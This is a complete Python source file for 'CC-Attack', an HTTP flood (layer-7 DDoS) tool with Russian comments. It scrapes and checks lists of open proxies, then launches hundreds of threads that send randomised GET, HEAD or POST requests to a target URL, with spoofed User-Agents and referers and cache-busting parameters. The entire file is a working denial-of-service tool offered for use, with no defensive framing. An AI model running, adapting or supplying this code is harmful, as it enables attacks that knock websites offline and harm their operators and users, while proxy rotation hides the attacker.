#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
CC-Attack v3.9.0 — refactored
Author: DIDO
Requires: pip install requests pysocks
"""
import argparse
import concurrent.futures as cf
import datetime
import logging
import os
import platform
import random
import signal
import socket
import ssl
import sys
import threading
import time
from pathlib import Path

import requests
import socks

# ─────────────────────────────────────────────────────────────────────────────
#  ANSI / цветовая палитра
# ─────────────────────────────────────────────────────────────────────────────
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    RED   = "\033[91m"
    ORG   = "\033[38;5;208m"
    YEL   = "\033[93m"
    GRN   = "\033[92m"
    CYN   = "\033[96m"
    BLU   = "\033[94m"
    PRP   = "\033[95m"
    WHT   = "\033[97m"

VERSION = "3.9.0"
BUILD   = "2026/09/24"

# ─────────────────────────────────────────────────────────────────────────────
#  Красивый баннер
# ─────────────────────────────────────────────────────────────────────────────
DIDO_ART = r"""
   ██████╗ ██╗██████╗  ██████╗
   ██╔══██╗██║██╔══██╗██╔═══██╗
   ██║  ██║██║██║  ██║██║   ██║
   ██║  ██║██║██║  ██║██║   ██║
   ██████╔╝██║██████╔╝╚██████╔╝
   ╚═════╝ ╚═╝╚═════╝  ╚═════╝
"""

CC_ART = r"""
    ██████╗ ██████╗
   ██╔════╝██╔════╝
   ██║     ██║
   ██║     ██║
   ╚██████╗╚██████╗
    ╚═════╝ ╚═════╝
"""

def print_banner() -> None:
    line_top = f"{C.RED}╔{'═' * 62}╗{C.RESET}"
    line_bot = f"{C.RED}╚{'═' * 62}╝{C.RESET}"
    line_mid = f"{C.RED}╠{'═' * 62}╣{C.RESET}"

    def row(text: str, color: str = C.WHT, pad: int = 62) -> str:
        # грубая оценка длины без ANSI
        vis = len(text)
        left  = (pad - vis) // 2
        right = pad - vis - left
        return (f"{C.RED}║{C.RESET}"
                f"{' ' * left}{color}{text}{C.RESET}{' ' * right}"
                f"{C.RED}║{C.RESET}")

    print()
    print(line_top)
    print(row("C C - A T T A C K", C.YEL))
    print(row(f"v{VERSION}  •  {BUILD}", C.CYN))
    print(line_mid)

    # ASCII-арт по центру
    for art_line in DIDO_ART.strip("\n").split("\n"):
        print(f"{C.RED}║{C.RESET}{art_line.center(62)}{C.RED}║{C.RESET}")

    print(line_mid)
    print(row("P R E S E N T E D   B Y", C.DIM))
    for art_line in CC_ART.strip("\n").split("\n"):
        print(f"{C.RED}║{C.RESET}{art_line.center(62)}{C.RED}║{C.RESET}")

    print(line_mid)
    print(row(f"Python {platform.python_version()}  |  {platform.system()} {platform.release()}",
              C.GRN))
    print(row(f"CPU: {platform.machine()}  |  PID: {os.getpid()}", C.GRN))
    print(line_bot)
    print()

# ─────────────────────────────────────────────────────────────────────────────
#  Источники прокси (актуальные на 2025–2026)
# ─────────────────────────────────────────────────────────────────────────────
BUILTIN_PROXY_SOURCES = {
    "socks4": [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
        "https://openproxylist.xyz/socks4.txt",
        "https://proxyspace.pro/socks4.txt",
        "https://www.proxy-list.download/api/v1/get?type=socks4",
    ],
    "socks5": [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
        "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
        "https://openproxylist.xyz/socks5.txt",
        "https://proxyspace.pro/socks5.txt",
        "https://www.proxy-list.download/api/v1/get?type=socks5",
    ],
    "http": [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&simplified=true",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
        "https://openproxylist.xyz/http.txt",
        "https://proxyspace.pro/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
    ],
}

# ─────────────────────────────────────────────────────────────────────────────
#  Логгер
# ─────────────────────────────────────────────────────────────────────────────
class Log:
    _lock = threading.Lock()

    @staticmethod
    def _emit(prefix: str, color: str, msg: str) -> None:
        with Log._lock:
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            sys.stdout.write(
                f"{C.DIM}[{ts}]{C.RESET} {color}{prefix}{C.RESET} {msg}\n"
            )
            sys.stdout.flush()

    @staticmethod
    def info(m): Log._emit("[*]", C.CYN, m)
    @staticmethod
    def ok(m):   Log._emit("[+]", C.GRN, m)
    @staticmethod
    def warn(m): Log._emit("[!]", C.YEL, m)
    @staticmethod
    def err(m):  Log._emit("[-]", C.RED, m)

# ─────────────────────────────────────────────────────────────────────────────
#  UA / Accept / Referer
# ─────────────────────────────────────────────────────────────────────────────
_CHROME_VERSIONS = [f"{v}.0.0.0" for v in range(120, 137)]
_FIREFOX_VERSIONS = [f"{v}.0" for v in range(120, 135)]
_OS_WINDOWS = [
    "Windows NT 10.0; Win64; x64",
    "Windows NT 10.0; WOW64",
    "Windows NT 10.0",
    "Windows NT 6.3; Win64; x64",
    "Windows NT 6.1; Win64; x64",
]
_OS_MAC = [
    "Macintosh; Intel Mac OS X 10_15_7",
    "Macintosh; Intel Mac OS X 11_7_10",
    "Macintosh; Intel Mac OS X 12_7_6",
    "Macintosh; Intel Mac OS X 13_6_6",
    "Macintosh; Intel Mac OS X 14_6_1",
]
_OS_LINUX = ["X11; Linux x86_64", "X11; Linux i686", "X11; Ubuntu; Linux x86_64"]

ACCEPT_HEADERS = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: application/json, text/plain, */*\r\nAccept-Encoding: gzip, deflate, br\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
    "Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.google.ru/search?q=",
    "https://yandex.ru/search/?text=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=",
    "https://www.youtube.com/results?search_query=",
    "https://vk.com/search?c[q]=",
    "https://ok.ru/search?st.query=",
    "https://steamcommunity.com/market/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/?q=",
    "https://check-host.net/",
    "https://github.com/search?q=",
    "https://stackoverflow.com/search?q=",
    "https://www.reddit.com/search/?q=",
]

_UA_CACHE: list[str] = []
_UA_CACHE_LOCK = threading.Lock()

def get_ua() -> str:
    """Кэшированный User-Agent (генерим пачку раз в 512 вызовов)."""
    if not _UA_CACHE:
        with _UA_CACHE_LOCK:
            if not _UA_CACHE:
                for _ in range(512):
                    plat = random.choice(("win", "mac", "lin"))
                    if plat == "win":
                        os_str = random.choice(_OS_WINDOWS)
                    elif plat == "mac":
                        os_str = random.choice(_OS_MAC)
                    else:
                        os_str = random.choice(_OS_LINUX)
                    if random.random() < 0.7:
                        wv = random.randint(537, 605)
                        cv = random.choice(_CHROME_VERSIONS)
                        _UA_CACHE.append(
                            f"Mozilla/5.0 ({os_str}) AppleWebKit/{wv}.36 "
                            f"(KHTML, like Gecko) Chrome/{cv} Safari/{wv}.36"
                        )
                    else:
                        fv = random.choice(_FIREFOX_VERSIONS)
                        _UA_CACHE.append(
                            f"Mozilla/5.0 ({os_str}; rv:{fv}) "
                            f"Gecko/20100101 Firefox/{fv}"
                        )
    return random.choice(_UA_CACHE)


# ─────────────────────────────────────────────────────────────────────────────
#  Ядро
# ─────────────────────────────────────────────────────────────────────────────
class CCHandler:
    def __init__(self, target: str, path: str, port: int, protocol: str,
                 proxies: list[str], proxy_type: int, cookies: str,
                 post_data: str, brute: bool, stop_event: threading.Event,
                 header_refresh: int = 32):
        self.target = target
        self.path = path
        self.port = port
        self.protocol = protocol
        self.proxies = proxies
        self.proxy_type = proxy_type
        self.cookies = cookies
        self.post_data = post_data
        self.brute = brute
        self.stop = stop_event
        self.header_refresh = header_refresh
        self._hdr_cache: dict[str, tuple[str, int]] = {}
        self._plock = threading.Lock()
        self.stats = {"sent": 0, "errors": 0, "bytes": 0}
        self._slock = threading.Lock()

    # ── статистика ──────────────────────────────────────────────
    def _stat(self, sent: int = 0, err: bool = False) -> None:
        with self._slock:
            if sent:
                self.stats["sent"] += 1
                self.stats["bytes"] += sent
            if err:
                self.stats["errors"] += 1

    # ── выбор прокси ────────────────────────────────────────────
    def _pick_proxy(self) -> tuple[str, int]:
        with self._plock:
            p = random.choice(self.proxies).strip()
        host, _, port = p.partition(":")
        return host, int(port)

    # ── генерация заголовка с кэшем ─────────────────────────────
    def _header(self, method: str) -> str:
        bucket = self._hdr_cache.setdefault(method, ("", 0))
        cached, count = bucket
        if cached and count < self.header_refresh:
            self._hdr_cache[method] = (cached, count + 1)
            return cached
        hdr = self._build_header(method)
        self._hdr_cache[method] = (hdr, 0)
        return hdr

    def _build_header(self, method: str) -> str:
        if method in ("get", "head"):
            conn = "Connection: Keep-Alive\r\n"
            if self.cookies:
                conn += f"Cookie: {self.cookies}\r\n"
            ref  = f"Referer: {random.choice(REFERERS)}{self.target}{self.path}\r\n"
            ua   = f"User-Agent: {get_ua()}\r\n"
            acc  = random.choice(ACCEPT_HEADERS)
            return ref + ua + acc + conn + "\r\n"

        # post
        body = self.post_data or os.urandom(16).hex()
        lines = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"{random.choice(ACCEPT_HEADERS)}"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"X-Requested-With: XMLHttpRequest\r\n"
            f"Referer: http://{self.target}{self.path}\r\n"
            f"User-Agent: {get_ua()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: Keep-Alive\r\n"
        )
        if self.cookies:
            lines += f"Cookie: {self.cookies}\r\n"
        return lines + "\r\n" + body + "\r\n\r\n"

    # ── открытие сокета ─────────────────────────────────────────
    def _open(self, host: str, port: int) -> socket.socket:
        s = socks.socksocket()
        if self.proxy_type == 4:
            s.set_proxy(socks.SOCKS4, host, port)
        elif self.proxy_type == 5:
            s.set_proxy(socks.SOCKS5, host, port)
        else:
            s.set_proxy(socks.HTTP, host, port)
        if self.brute:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(3)
        s.connect((self.target, self.port))
        if self.protocol == "https":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.target)
        return s

    # ── воркер ──────────────────────────────────────────────────
    def run(self, mode: str) -> None:
        method = {"cc": "get", "head": "head", "post": "post"}[mode]
        verb   = {"cc": "GET", "head": "HEAD", "post": "POST"}[mode]
        sep    = "&" if "?" in self.path else "?"

        while not self.stop.is_set():
            host, port = self._pick_proxy()
            s = None
            try:
                s = self._open(host, port)
                hdr = self._header(method)
                for _ in range(100):
                    if self.stop.is_set():
                        break
                    if mode == "post":
                        req = hdr
                    else:
                        req = (
                            f"{verb} {self.path}{sep}{random.randint(0, 271400281257)} "
                            f"HTTP/1.1\r\nHost: {self.target}\r\n{hdr}"
                        )
                    n = s.send(req.encode("utf-8", "ignore"))
                    if not n:
                        host, port = self._pick_proxy()
                        break
                    self._stat(sent=n)
                s.close()
            except Exception:
                self._stat(err=True)
                if s is not None:
                    try: s.close()
                    except Exception: pass


# ─────────────────────────────────────────────────────────────────────────────
#  Загрузка / нормализация прокси
# ─────────────────────────────────────────────────────────────────────────────
def download_proxies(proxy_ver: str, out_file: Path) -> None:
    key = {"4": "socks4", "5": "socks5", "http": "http"}.get(proxy_ver, "socks5")
    urls = BUILTIN_PROXY_SOURCES[key]
    Log.info(f"Загрузка прокси: {len(urls)} источников ({key})…")
    seen: set[str] = set()
    total = 0
    with out_file.open("w", encoding="utf-8") as f:
        for api in urls:
            try:
                r = requests.get(api, timeout=8,
                                 headers={"User-Agent": get_ua()})
                if r.status_code != 200:
                    continue
                for line in r.text.splitlines():
                    line = line.strip()
                    if not line or ":" not in line or line in seen:
                        continue
                    seen.add(line)
                    f.write(line + "\n")
                    total += 1
            except Exception:
                continue
    Log.ok(f"Сохранено {total} уникальных прокси → {out_file}")


def normalize_proxy_file(path: Path) -> None:
    """Оставляет только валидные IPv4/IPv6:port без дублей."""
    if not path.exists():
        return
    seen: set[str] = set()
    keep: list[str] = []
    for raw in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = raw.strip()
        if not line or "#" in line or ":" not in line or line in seen:
            continue
        host = line.split(":", 1)[0].strip("[]")
        try:
            socket.inet_pton(socket.AF_INET, host)
        except OSError:
            try:
                socket.inet_pton(socket.AF_INET6, host)
            except OSError:
                continue
        seen.add(line)
        keep.append(line)
    path.write_text("\n".join(keep) + ("\n" if keep else ""), encoding="utf-8")
    Log.info(f"Нормализовано: {len(keep)} прокси")


# ─────────────────────────────────────────────────────────────────────────────
#  Проверка прокси (ThreadPool)
# ─────────────────────────────────────────────────────────────────────────────
def _check_one(line: str, proxy_type: int, ms: int) -> bool:
    host, _, port = line.partition(":")
    if not host or not port:
        return False
    s = None
    try:
        s = socks.socksocket()
        if proxy_type == 4:
            s.set_proxy(socks.SOCKS4, host, int(port))
        elif proxy_type == 5:
            s.set_proxy(socks.SOCKS5, host, int(port))
        else:
            s.set_proxy(socks.HTTP, host, int(port))
        s.settimeout(ms)
        s.connect(("1.1.1.1", 80))
        s.send(b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\n\r\n")
        return True
    except Exception:
        return False
    finally:
        if s is not None:
            try: s.close()
            except Exception: pass


def check_proxies(proxies: list[str], proxy_type: int, ms: int = 3,
                  workers: int = 200) -> list[str]:
    Log.info(f"Проверка {len(proxies)} прокси (timeout={ms}s, workers={workers})…")
    alive: list[str] = []
    done = 0
    total = len(proxies)
    lock = threading.Lock()

    with cf.ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(_check_one, p, proxy_type, ms): p
                   for p in proxies}
        for fut in cf.as_completed(futures):
            line = futures[fut]
            try:
                if fut.result():
                    alive.append(line)
            except Exception:
                pass
            with lock:
                done += 1
                if done % 20 == 0 or done == total:
                    sys.stdout.write(
                        f"\r  > проверено {done}/{total}  "
                        f"живых: {len(alive)}   "
                    )
                    sys.stdout.flush()
    print()
    Log.ok(f"Рабочих прокси: {len(alive)}")
    return alive


# ─────────────────────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="cc.py",
        description="CC-Attack v" + VERSION + " by DIDO",
        add_help=False,
    )
    p.add_argument("-h", "-help", "--help", action="store_true",
                   dest="help", help="показать справку")
    p.add_argument("-url",  metavar="URL",   help="целевой URL")
    p.add_argument("-m", "-mode", dest="mode",
                   choices=("cc", "post", "head"), default="cc",
                   help="режим атаки (по умолчанию: cc)")
    p.add_argument("-v", dest="proxy_ver", choices=("4", "5", "http"),
                   default="5", help="тип прокси (4/5/http)")
    p.add_argument("-t", dest="threads", type=int, default=800,
                   help="количество потоков (по умолчанию: 800)")
    p.add_argument("-f", dest="out_file", default="proxy.txt",
                   help="файл прокси (по умолчанию: proxy.txt)")
    p.add_argument("-s", dest="period", type=int, default=60,
                   help="время атаки в секундах (по умолчанию: 60)")
    p.add_argument("-b", dest="brute", choices=("0", "1"), default="0",
                   help="brute-force TCP_NODELAY (0/1)")
    p.add_argument("-data", dest="data", help="файл POST-данных")
    p.add_argument("-cookies", dest="cookies", default="",
                   help="cookies строкой")
    p.add_argument("-down", action="store_true",
                   help="скачать свежий список прокси")
    p.add_argument("-check", action="store_true",
                   help="проверить прокси перед атакой")
    p.add_argument("-log", dest="log_file",
                   help="дублировать лог в файл")
    return p


def print_help() -> None:
    print(f"""{C.BOLD}{C.YEL}CC-Attack v{VERSION}{C.RESET}  —  справка

  {C.CYN}-url{C.RESET}      <URL>          цель (обязательно)
  {C.CYN}-m{C.RESET}        cc|post|head   режим (по умолчанию cc)
  {C.CYN}-v{C.RESET}        4|5|http       тип прокси (по умолчанию 5)
  {C.CYN}-t{C.RESET}        <N>            потоков (по умолчанию 800)
  {C.CYN}-s{C.RESET}        <сек>          длительность атаки (60)
  {C.CYN}-b{C.RESET}        0|1            TCP_NODELAY brute (0)
  {C.CYN}-f{C.RESET}        <файл>         файл прокси (proxy.txt)
  {C.CYN}-data{C.RESET}     <файл>         POST-тело (только для -m post)
  {C.CYN}-cookies{C.RESET}  'a=1;b=2'      Cookie-строка
  {C.CYN}-down{C.RESET}                    скачать прокси
  {C.CYN}-check{C.RESET}                   проверить прокси
  {C.CYN}-log{C.RESET}      <файл>         дублировать вывод в файл
  {C.CYN}-h{C.RESET}                       эта справка
""")


# ─────────────────────────────────────────────────────────────────────────────
#  main
# ─────────────────────────────────────────────────────────────────────────────
def main() -> int:
    print_banner()
    args = build_parser().parse_args()

    if args.help:
        print_help()
        return 0

    if args.log_file:
        logging.basicConfig(
            filename=args.log_file, level=logging.INFO,
            format="%(asctime)s %(message)s",
        )

    if not args.url:
        Log.err("Не задан -url. Завершение.")
        return 1

    # ── разбор URL ──
    raw = args.url.strip()
    if raw.startswith("https://"):
        protocol, rest = "https", raw[8:]
    elif raw.startswith("http://"):
        protocol, rest = "http",  raw[7:]
    else:
        Log.err("URL должен начинаться с http:// или https://")
        return 1

    hostport, _, tail = rest.partition("/")
    path = "/" + tail if tail else "/"
    if ":" in hostport:
        target, port_s = hostport.split(":", 1)
        port = int(port_s)
    else:
        target, port = hostport, (443 if protocol == "https" else 80)

    proxy_type = {"4": 4, "5": 5, "http": 0}[args.proxy_ver]
    out_file = Path(args.out_file)

    # ── прокси ──
    if args.down or not out_file.exists():
        download_proxies(args.proxy_ver, out_file)

    normalize_proxy_file(out_file)
    proxies = [l.strip() for l in out_file.read_text(
        encoding="utf-8", errors="ignore").splitlines() if l.strip()]

    if not proxies:
        Log.err("Нет прокси. Используйте -down.")
        return 1
    Log.ok(f"Прокси в наличии: {len(proxies)}")

    if args.check:
        proxies = check_proxies(proxies, proxy_type, ms=3, workers=200)
        if not proxies:
            Log.err("Не найдено рабочих прокси.")
            return 1
        out_file.write_text("\n".join(proxies) + "\n", encoding="utf-8")

    # ── POST data ──
    post_data = ""
    if args.data:
        try:
            post_data = Path(args.data).read_text(
                encoding="utf-8", errors="ignore").replace("\n", " ")
        except OSError as e:
            Log.err(f"Не читается -data: {e}")
            return 1

    # ── заголовок цели ──
    Log.info(f"Цель: {C.WHT}{protocol}://{target}:{port}{path}{C.RESET}")
    Log.info(f"Режим: {C.WHT}{args.mode}{C.RESET}  •  "
             f"потоков: {C.WHT}{args.threads}{C.RESET}  •  "
             f"прокси: {C.WHT}{args.proxy_ver}{C.RESET}")

    stop_event = threading.Event()

    def _shutdown(signum, frame):
        if stop_event.is_set():
            Log.warn("Повторный сигнал — жёсткий выход.")
            os._exit(1)
        Log.warn("Завершение по Ctrl+C…")
        stop_event.set()

    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    handler = CCHandler(
        target=target, path=path, port=port, protocol=protocol,
        proxies=proxies, proxy_type=proxy_type, cookies=args.cookies,
        post_data=post_data, brute=(args.brute == "1"),
        stop_event=stop_event,
    )

    Log.info("Запуск потоков…")
    threads = []
    for _ in range(args.threads):
        th = threading.Thread(target=handler.run, args=(args.mode,), daemon=True)
        th.start()
        threads.append(th)

    start = time.time()
    try:
        while time.time() - start < args.period and not stop_event.is_set():
            time.sleep(1)
            elapsed = int(time.time() - start)
            sys.stdout.write(
                f"\r  {C.GRN}▶{C.RESET} {elapsed:>3}/{args.period}s  "
                f"| {C.CYN}отправлено:{C.RESET} {handler.stats['sent']:<8} "
                f"| {C.RED}ошибок:{C.RESET} {handler.stats['errors']:<8} "
                f"| {C.YEL}МБ:{C.RESET} {handler.stats['bytes']/1048576:.2f}"
            )
            sys.stdout.flush()
    finally:
        stop_event.set()
        print()
        Log.ok(f"Готово. Отправлено: {handler.stats['sent']}, "
               f"ошибок: {handler.stats['errors']}, "
               f"трафик: {handler.stats['bytes']/1048576:.2f} МБ")

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        Log.warn("Прервано пользователем.")
        sys.exit(130)